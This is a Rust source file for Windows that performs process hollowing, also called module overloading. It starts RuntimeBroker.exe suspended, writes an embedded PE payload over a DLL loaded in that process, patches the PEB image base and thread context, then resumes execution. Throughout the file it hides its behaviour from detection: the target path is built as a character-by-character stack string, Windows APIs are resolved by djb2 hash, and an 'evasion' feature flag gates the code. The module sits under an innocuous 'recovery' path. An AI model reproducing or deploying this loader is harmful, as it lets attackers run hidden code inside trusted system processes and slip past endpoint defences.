#![allow(non_snake_case)]

use std::ffi::c_void;

#[cfg(feature = "evasion")]
use crate::recovery::helpers::payload::{allow_disk_fallback, get_embedded_payload};
use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
#[cfg(feature = "evasion")]
use crate::recovery::settings::RecoveryControl;
#[cfg(feature = "evasion")]
use crate::stack_str;
#[cfg(feature = "evasion")]
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
#[cfg(not(feature = "evasion"))]
use tracing::debug;
#[cfg(feature = "evasion")]
use tracing::{debug, error, info, warn};
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE,
};
use windows_sys::Win32::System::ProcessStatus::MODULEINFO;
use windows_sys::Win32::System::Threading::{
    CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
};

use crate::dynamic_invoke;
use crate::recovery::helpers::dynamic_api::{djb2_hash, KERNEL32_HASH};

#[repr(C)]
pub struct IMAGE_BASE_RELOCATION {
    pub virtual_address: u32,
    pub size_of_block: u32,
}

const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

pub async fn perform_hollowing() -> bool {
    #[cfg(feature = "evasion")]
    {
        if !RecoveryControl::global().evasion_enabled() {
            return false;
        }

        let args: Vec<String> = env::args().collect();
        if args.contains(&"--hollowed".to_string()) {
            debug!("already running in hollowed process");
            return false;
        }

        info!("attempting module overloading for stealth");

        let target_str = stack_str!(
            'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm',
            '3', '2', '\\', 'R', 'u', 'n', 't', 'i', 'm', 'e', 'B', 'r', 'o', 'k', 'e', 'r', '.',
            'e', 'x', 'e'
        );
        let target = &target_str;

        let payload_bytes = if let Some(bytes) = get_embedded_payload() {
            debug!("using embedded payload from memory (stealthy)");
            bytes
        } else {
            if !allow_disk_fallback() {
                error!("embedded payload missing and disk fallback is disabled");
                return false;
            }

            warn!("falling back to disk read for payload (noisy)");
            let Ok(current_exe_path) = env::current_exe() else {
                return false;
            };
            match std::fs::read(&current_exe_path) {
                Ok(bytes) => bytes,
                Err(e) => {
                    error!("failed to read payload from disk: {}", e);
                    return false;
                }
            }
        };

        match run_overloaded(&payload_bytes, target) {
            Ok(_) => {
                info!(
                    "successfully overloaded into {}, signaling for exit",
                    target
                );
                true
            }
            Err(e) => {
                error!("module overloading failed: {}", e);
                false
            }
        }
    }

    #[cfg(not(feature = "evasion"))]
    false
}

pub fn run_overloaded(
    payload_bytes: &[u8],
    target_path: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut payload_bytes = payload_bytes.to_vec();
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let target_w: Vec<u16> = OsStr::new(target_path)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\" --hollowed", target_path))
            .encode_wide()
            .chain(Some(0))
            .collect();

        type FnCreateProcessW = unsafe extern "system" fn(
            lpApplicationName: *const u16,
            lpCommandLine: *mut u16,
            lpProcessAttributes: *const c_void,
            lpThreadAttributes: *const c_void,
            bInheritHandles: i32,
            dwCreationFlags: u32,
            lpEnvironment: *const c_void,
            lpCurrentDirectory: *const u16,
            lpStartupInfo: *const STARTUPINFOW,
            lpProcessInformation: *mut PROCESS_INFORMATION,
        ) -> i32;

        let success = dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("CreateProcessW"),
            FnCreateProcessW,
            target_w.as_ptr(),
            command_line.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi
        ).ok_or("Failed to invoke CreateProcessW")?;

        if success == 0 {
            return Err("CreateProcessW failed".into());
        }

        let _pi_guard = ProcessInformationGuard(pi);

        let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
        let nt_headers = &*(payload_bytes.as_ptr().add(dos_header.e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64);
        let payload_size = nt_headers.optional_header.size_of_image as usize;

        let mut h_modules = [std::ptr::null_mut(); 1024];
        let mut cb_needed = 0;

        type FnK32EnumProcessModules = unsafe extern "system" fn(
            hProcess: *mut c_void,
            lphModule: *mut *mut c_void,
            cb: u32,
            lpcbNeeded: *mut u32,
        ) -> i32;

        dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("K32EnumProcessModules"),
            FnK32EnumProcessModules,
            pi.hProcess,
            h_modules.as_mut_ptr(),
            std::mem::size_of_val(&h_modules) as u32,
            &mut cb_needed
        ).ok_or("Failed to invoke K32EnumProcessModules")?;

        let count = cb_needed as usize / std::mem::size_of::<*mut c_void>();
        let mut target_base: *mut c_void = std::ptr::null_mut();

        type FnK32GetModuleInformation = unsafe extern "system" fn(
            hProcess: *mut c_void,
            hModule: *mut c_void,
            lpmodinfo: *mut MODULEINFO,
            cb: u32,
        ) -> i32;

        type FnK32GetModuleFileNameExW = unsafe extern "system" fn(
            hProcess: *mut c_void,
            hModule: *mut c_void,
            lpFilename: *mut u16,
            nSize: u32,
        ) -> u32;

        for i in 0..count {
            let mut mod_info: MODULEINFO = std::mem::zeroed();
            dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("K32GetModuleInformation"),
                FnK32GetModuleInformation,
                pi.hProcess,
                h_modules[i],
                &mut mod_info,
                std::mem::size_of::<MODULEINFO>() as u32
            );

            if mod_info.SizeOfImage as usize >= payload_size {
                let mut path_buf = [0u16; 1024];
                let len = dynamic_invoke!(
                    KERNEL32_HASH,
                    djb2_hash("K32GetModuleFileNameExW"),
                    FnK32GetModuleFileNameExW,
                    pi.hProcess,
                    h_modules[i],
                    path_buf.as_mut_ptr(),
                    path_buf.len() as u32
                ).unwrap_or(0);

                let path = String::from_utf16_lossy(&path_buf[..len as usize]).to_lowercase();

                if !path.contains("ntdll.dll")
                    && !path.contains("kernel32.dll")
                    && !path.contains("kernelbase.dll")
                {
                    target_base = mod_info.lpBaseOfDll;
                    debug!(target_dll = %path, size = mod_info.SizeOfImage, "found target DLL for overloading");
                    break;
                }
            }
        }

        if target_base.is_null() {
            type FnVirtualAllocEx = unsafe extern "system" fn(
                hProcess: *mut c_void,
                lpAddress: *const std::ffi::c_void,
                dwSize: usize,
                flAllocationType: u32,
                flProtect: u32,
            ) -> *mut std::ffi::c_void;

            target_base = dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("VirtualAllocEx"),
                FnVirtualAllocEx,
                pi.hProcess,
                std::ptr::null_mut(),
                payload_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            ).unwrap_or(std::ptr::null_mut());
        }

        if target_base.is_null() {
            return Err("failed to find or allocate memory in target process".into());
        }

        let delta = target_base as isize - nt_headers.optional_header.image_base as isize;
        if delta != 0 {
            let reloc_dir =
                &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if reloc_dir.size > 0 {
                let mut current_reloc_offset = rva_to_offset(
                    reloc_dir.virtual_address,
                    nt_headers,
                    payload_bytes.as_ptr(),
                )?;
                let max_reloc_offset = current_reloc_offset + reloc_dir.size as usize;

                while current_reloc_offset < max_reloc_offset {
                    let reloc_block = &*(payload_bytes.as_ptr().add(current_reloc_offset)
                        as *const IMAGE_BASE_RELOCATION);
                    if reloc_block.size_of_block == 0 {
                        break;
                    }

                    let entries_count = (reloc_block.size_of_block as usize
                        - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        / 2;
                    let entries_ptr = payload_bytes
                        .as_ptr()
                        .add(current_reloc_offset + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        as *const u16;

                    for i in 0..entries_count {
                        let entry = *entries_ptr.add(i);
                        let reloc_type = entry >> 12;
                        let reloc_offset = entry & 0xFFF;

                        if reloc_type == IMAGE_REL_BASED_DIR64 {
                            let target_rva = reloc_block.virtual_address + reloc_offset as u32;
                            let target_file_offset =
                                rva_to_offset(target_rva, nt_headers, payload_bytes.as_ptr())?;

                            let val_ptr =
                                payload_bytes.as_mut_ptr().add(target_file_offset) as *mut i64;
                            *val_ptr += delta as i64;
                        }
                    }
                    current_reloc_offset += reloc_block.size_of_block as usize;
                }
            }
        }

        type FnVirtualProtectEx = unsafe extern "system" fn(
            hProcess: *mut c_void,
            lpAddress: *const std::ffi::c_void,
            dwSize: usize,
            flNewProtect: u32,
            lpflOldProtect: *mut u32,
        ) -> i32;

        let mut old_prot = 0u32;
        dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("VirtualProtectEx"),
            FnVirtualProtectEx,
            pi.hProcess,
            target_base,
            payload_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_prot
        ).ok_or("Failed to invoke VirtualProtectEx")?;

        type FnWriteProcessMemory = unsafe extern "system" fn(
            hProcess: *mut c_void,
            lpBaseAddress: *const std::ffi::c_void,
            lpBuffer: *const std::ffi::c_void,
            nSize: usize,
            lpNumberOfBytesWritten: *mut usize,
        ) -> i32;

        dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("WriteProcessMemory"),
            FnWriteProcessMemory,
            pi.hProcess,
            target_base,
            payload_bytes.as_ptr() as *const _,
            nt_headers.optional_header.size_of_headers as usize,
            std::ptr::null_mut()
        ).ok_or("Failed to invoke WriteProcessMemory")?;

        let section_header_ptr = (payload_bytes
            .as_ptr()
            .add(dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()))
            as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if section.size_of_raw_data > 0 {
                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                    as *mut std::ffi::c_void;
                let local_section_src = payload_bytes
                    .as_ptr()
                    .add(section.pointer_to_raw_data as usize)
                    as *const std::ffi::c_void;

                dynamic_invoke!(
                    KERNEL32_HASH,
                    djb2_hash("WriteProcessMemory"),
                    FnWriteProcessMemory,
                    pi.hProcess,
                    remote_section_dest,
                    local_section_src,
                    section.size_of_raw_data as usize,
                    std::ptr::null_mut()
                ).ok_or("Failed to invoke WriteProcessMemory")?;
            }
        }

        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if section.size_of_raw_data > 0 {
                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                    as *mut std::ffi::c_void;
                let is_executable = (section.characteristics & 0x20000000) != 0;
                let is_writable = (section.characteristics & 0x80000000) != 0;

                let prot = if is_executable {
                    PAGE_EXECUTE_READ
                } else if is_writable {
                    PAGE_READWRITE
                } else {
                    PAGE_READONLY
                };
                let mut temp = 0u32;
                dynamic_invoke!(
                    KERNEL32_HASH,
                    djb2_hash("VirtualProtectEx"),
                    FnVirtualProtectEx,
                    pi.hProcess,
                    remote_section_dest,
                    section.size_of_raw_data as usize,
                    prot,
                    &mut temp
                );
            }
        }

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = 0x100000 | 0x1 | 0x2 | 0x4; // CONTEXT_AMD64_FULL
        
        type FnGetThreadContext = unsafe extern "system" fn(
            hThread: *mut c_void,
            lpContext: *mut CONTEXT,
        ) -> i32;

        dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("GetThreadContext"),
            FnGetThreadContext,
            pi.hThread,
            &mut context
        ).ok_or("Failed to invoke GetThreadContext")?;

        #[cfg(target_arch = "x86_64")]
        {
            let peb_base = context.Rdx;
            let image_base_offset = peb_base + 0x10;

            let mut old_peb_prot = 0u32;
            dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("VirtualProtectEx"),
                FnVirtualProtectEx,
                pi.hProcess,
                image_base_offset as *const _,
                std::mem::size_of::<usize>(),
                PAGE_READWRITE,
                &mut old_peb_prot
            ).ok_or("Failed to set PEB write protection")?;

            dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("WriteProcessMemory"),
                FnWriteProcessMemory,
                pi.hProcess,
                (image_base_offset) as *const _,
                &target_base as *const _ as *const _,
                std::mem::size_of::<usize>(),
                std::ptr::null_mut()
            ).ok_or("Failed to write ImageBaseAddress to PEB")?;

            let mut temp = 0u32;
            dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("VirtualProtectEx"),
                FnVirtualProtectEx,
                pi.hProcess,
                image_base_offset as *const _,
                std::mem::size_of::<usize>(),
                old_peb_prot,
                &mut temp
            );

            context.Rcx =
                target_base as u64 + nt_headers.optional_header.address_of_entry_point as u64;
            
            type FnSetThreadContext = unsafe extern "system" fn(
                hThread: *mut c_void,
                lpContext: *const CONTEXT,
            ) -> i32;

            dynamic_invoke!(
                KERNEL32_HASH,
                djb2_hash("SetThreadContext"),
                FnSetThreadContext,
                pi.hThread,
                &context
            ).ok_or("Failed to set thread context")?;
        }

        type FnResumeThread = unsafe extern "system" fn(
            hThread: *mut c_void,
        ) -> u32;

        dynamic_invoke!(
            KERNEL32_HASH,
            djb2_hash("ResumeThread"),
            FnResumeThread,
            pi.hThread
        ).ok_or("Failed to resume thread")?;

        Ok(())
    }
}

fn rva_to_offset(
    rva: u32,
    nt_headers: &IMAGE_NT_HEADERS64,
    base_ptr: *const u8,
) -> Result<usize, Box<dyn std::error::Error>> {
    unsafe {
        let section_header_ptr = (base_ptr.add(
            (*(base_ptr.add(0x3C) as *const i32)) as usize
                + std::mem::size_of::<IMAGE_NT_HEADERS64>(),
        )) as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if rva >= section.virtual_address && rva < section.virtual_address + section.misc {
                return Ok((rva - section.virtual_address + section.pointer_to_raw_data) as usize);
            }
        }
    }
    Err("failed to map RVA to file offset".into())
}

struct ProcessInformationGuard(PROCESS_INFORMATION);

impl Drop for ProcessInformationGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.hProcess.is_null() && self.0.hProcess as isize != -1 {
                type FnCloseHandle = unsafe extern "system" fn(hObject: *mut c_void) -> i32;
                dynamic_invoke!(KERNEL32_HASH, djb2_hash("CloseHandle"), FnCloseHandle, self.0.hProcess);
            }
            if !self.0.hThread.is_null() && self.0.hThread as isize != -1 {
                type FnCloseHandle = unsafe extern "system" fn(hObject: *mut c_void) -> i32;
                dynamic_invoke!(KERNEL32_HASH, djb2_hash("CloseHandle"), FnCloseHandle, self.0.hThread);
            }
        }
    }
}
